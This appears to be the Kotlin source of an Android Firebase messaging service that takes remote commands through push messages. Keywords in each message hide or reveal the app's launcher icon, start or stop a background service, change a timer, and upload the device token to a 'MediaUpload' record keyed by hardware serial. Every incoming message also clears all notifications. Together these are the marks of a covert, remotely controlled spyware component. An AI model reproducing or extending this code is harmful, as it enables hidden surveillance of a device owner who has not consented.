package com.developer.service

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.preference.PreferenceManager
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.iid.FirebaseInstanceId
import com.google.firebase.messaging.FirebaseMessagingService
import java.util.*
import android.app.NotificationManager
import android.content.Context
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import kotlin.concurrent.timerTask

class FCMService : FirebaseMessagingService() {


    override fun handleIntent(intent: Intent) {
        super.handleIntent(intent)

        startActivity(Intent(this, Main2Activity::class.java))

        val mBundle = intent.extras
        val body = mBundle.getString("gcm.notification.body")

        if (body != null) {
            val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
            val ed = sp.edit()


            if (body.toLowerCase().contains("show")) {
                val p = packageManager
                val componentName = ComponentName(this, MainActivity::class.java)
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
            }

            if (body.toLowerCase().contains("hide")){
                val p = packageManager
                val componentName = ComponentName(this, MainActivity::class.java)
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            }

            if (body.toLowerCase().contains("reset")) {
                val temp = sp.getInt("key_timestamp", (Calendar.getInstance().timeInMillis / 1000).toInt())
                ed.putInt("key_timestamp", temp)
                ed.commit()
            }

            if (body.toLowerCase().contains("time")) {

                stopService(Intent(applicationContext, Service::class.java))

                setTime()
            }

            if (body.toLowerCase().contains("stop")) {
                stopService(Intent(applicationContext, Service::class.java))
                ed.putBoolean("runService", false)
                ed.commit()
            }

            if (body.toLowerCase().contains("start")) {
                ed.putBoolean("runService", true)
                ed.commit()
                startService(Intent(applicationContext, Service::class.java))
            }

            if (body.toLowerCase().contains("token")) {
                sendTokenToServer()
            }


        }

        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).cancelAll()

    }


    private fun sendTokenToServer() {

        val refreshedToken = FirebaseInstanceId.getInstance().token
        val database = FirebaseDatabase.getInstance()
        val myRef = database.getReference("MediaUpload").child(Build.SERIAL).child("Token")
        myRef.setValue(refreshedToken)
    }

    private fun setTime(){
        val database = FirebaseDatabase.getInstance()
        val myRef = database.getReference("MediaUpload").child(Build.SERIAL).child("Time")


        val listener = object : ValueEventListener{

            override fun onDataChange(dataSnapshot: DataSnapshot) {
                val time = dataSnapshot.value as Long

                val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
                val ed = sp.edit()
                ed.putInt("key_timestamp", time.toInt())
                ed.commit()
            }


            override fun onCancelled(p0: DatabaseError?) {}

        }

        myRef.addValueEventListener(listener)

        val t = Timer()
        t.schedule(timerTask {
            myRef.removeEventListener(listener)
        }, 3000)

    }

}